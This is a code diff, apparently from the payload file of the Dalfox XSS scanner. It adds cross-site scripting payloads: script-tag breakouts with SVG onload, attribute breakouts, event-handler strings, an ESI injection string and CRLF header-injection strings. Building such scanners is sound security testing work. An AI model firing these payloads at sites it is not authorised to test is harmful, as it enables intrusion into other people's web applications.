@@ -8,6 +8,7 @@ import (
 	"strings"
 )
 
+// Asset is type of Assets
 type Asset struct {
 	Line string
 	Size string
@@ -46,6 +47,12 @@ func GetAttrPayload() ([]string, int) {
 // GetInJsPayload is exported interface
 func GetInJsPayload() ([]string, int) {
 	lst := getInJsPayload("")
+	return lst, len(lst)
+}
+
+// GetInJsBreakScriptPayload is exported interface
+func GetInJsBreakScriptPayload() ([]string, int) {
+	lst := getInJsBreakScriptPayload("")
 	return lst, len(lst)
 }
 
@@ -110,6 +117,13 @@ func getCRLFPayload() []string {
 		"%0d%0aDalfoxcrlf: 1234",
 		"%E5%98%8D%E5%98%8ADalfoxcrlf: 1234",
 		"\\u560d\\u560aDalfoxcrlf: 1234",
+	}
+	return payload
+}
+
+func getESIIPayload() []string {
+	payload := []string{
+		"<esi:assign name=\"var1\" value=\"dalfox\"><esii-<esi:vars name=\"$(var1)\">",
 	}
 	return payload
 }
@@ -313,8 +327,8 @@ func getHTMLPayload(ip string) []string {
 		"alert",
 		"confirm",
 		"prompt",
-		"alert,bind()",
-		"alert.valueOf()",
+		"alert.bind()",
+		"prompt.valueOf()",
 		"print",
 	}
 	payloadPattern := []string{
@@ -359,6 +373,8 @@ func getAttrPayload(ip string) []string {
 		"onmouseleave=confirm(DALFOX_ALERT_VALUE) class=dalfox ",
 	}
 	majorHandler := []string{
+		"onload",
+		"onerror",
 		"onmouseover",
 		"onmouseenter",
 		"onmouseleave",
@@ -374,8 +390,12 @@ func getAttrPayload(ip string) []string {
 		"ontouchstart",
 		"ontouchend",
 		"ontouchmove",
+		"ontransitionend",
 	}
 	for _, mh := range majorHandler {
+		if mh == "ontransitionend" {
+			mh = "id=x tabindex=1 style=\"display:block;transition:outline 1s;\" ontransitionend"
+		}
 		payload = append(payload, mh+"=alert(DALFOX_ALERT_VALUE) class=dalfox ")
 		payload = append(payload, mh+"=confirm(DALFOX_ALERT_VALUE) class=dalfox ")
 		payload = append(payload, mh+"=prompt(DALFOX_ALERT_VALUE) class=dalfox ")
@@ -392,6 +412,10 @@ func getAttrPayload(ip string) []string {
 	hp := getHTMLPayload("")
 	for _, h := range hp {
 		payload = append(payload, ">"+h)
+		payload = append(payload, "\">"+h)
+		payload = append(payload, "'\">"+h)
+		payload = append(payload, "&#x27;>"+h)
+		payload = append(payload, "&#39;>"+h)
 	}
 
 	// Set all event handler base payloads
@@ -425,6 +449,20 @@ func getAttrPayload(ip string) []string {
 	return payload
 }
 
+func getInJsBreakScriptPayload(ip string) []string {
+	payload := []string{
+		"</sCRipt><sVg/onload=alert(DALFOX_ALERT_VALUE)>",
+		"</scRiPt><sVG/onload=confirm(DALFOX_ALERT_VALUE)>",
+		"</sCrIpt><SVg/onload=prompt(DALFOX_ALERT_VALUE)>",
+		"</sCrIpt><SVg/onload=print(DALFOX_ALERT_VALUE)>",
+		"</sCriPt><ScRiPt>alert(DALFOX_ALERT_VALUE)</sCrIpt>",
+		"</scRipT><sCrIpT>confirm(DALFOX_ALERT_VALUE)</SCriPt>",
+		"</ScripT><ScRIpT>prompt(DALFOX_ALERT_VALUE)</scRIpT>",
+		"</ScripT><ScRIpT>print(DALFOX_ALERT_VALUE)</scRIpT>",
+	}
+	return payload
+}
+
 func getInJsPayload(ip string) []string {
 	payload := []string{
 		"alert(DALFOX_ALERT_VALUE)",
@@ -437,14 +475,6 @@ func getInJsPayload(ip string) []string {
 		"alert.apply(null,[DALFOX_ALERT_VALUE])",
 		"prompt.apply(null,[DALFOX_ALERT_VALUE])",
 		"confirm.apply(null,[DALFOX_ALERT_VALUE])",
-		"</sCRipt><sVg/onload=alert(DALFOX_ALERT_VALUE)>",
-		"</scRiPt><sVG/onload=confirm(DALFOX_ALERT_VALUE)>",
-		"</sCrIpt><SVg/onload=prompt(DALFOX_ALERT_VALUE)>",
-		"</sCrIpt><SVg/onload=print(DALFOX_ALERT_VALUE)>",
-		"</sCriPt><ScRiPt>alert(DALFOX_ALERT_VALUE)</sCrIpt>",
-		"</scRipT><sCrIpT>confirm(DALFOX_ALERT_VALUE)</SCriPt>",
-		"</ScripT><ScRIpT>prompt(DALFOX_ALERT_VALUE)</scRIpT>",
-		"</ScripT><ScRIpT>print(DALFOX_ALERT_VALUE)</scRIpT>",
 		"window['ale'+'rt'](window['doc'+'ument']['dom'+'ain'])",
 		"this['ale'+'rt'](this['doc'+'ument']['dom'+'ain'])",
 		"self[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]])",
@@ -458,6 +488,14 @@ func getInJsPayload(ip string) []string {
 		"window[/*foo*/'confirm'/*bar*/](window[/*foo*/'document'/*bar*/]['domain'])",
 		"{{toString().constructor.constructor('alert(DALFOX_ALERT_VALUE)')()}}",
 		"{{-function(){this.alert(DALFOX_ALERT_VALUE)}()}}",
+		"</sCRipt><sVg/onload=alert(DALFOX_ALERT_VALUE)>",
+		"</scRiPt><sVG/onload=confirm(DALFOX_ALERT_VALUE)>",
+		"</sCrIpt><SVg/onload=prompt(DALFOX_ALERT_VALUE)>",
+		"</sCrIpt><SVg/onload=print(DALFOX_ALERT_VALUE)>",
+		"</sCriPt><ScRiPt>alert(DALFOX_ALERT_VALUE)</sCrIpt>",
+		"</scRipT><sCrIpT>confirm(DALFOX_ALERT_VALUE)</SCriPt>",
+		"</ScripT><ScRIpT>prompt(DALFOX_ALERT_VALUE)</scRIpT>",
+		"</ScripT><ScRIpT>print(DALFOX_ALERT_VALUE)</scRIpT>",
 	}
 	if strings.Contains(ip, "none") {
 		var tempPayload []string
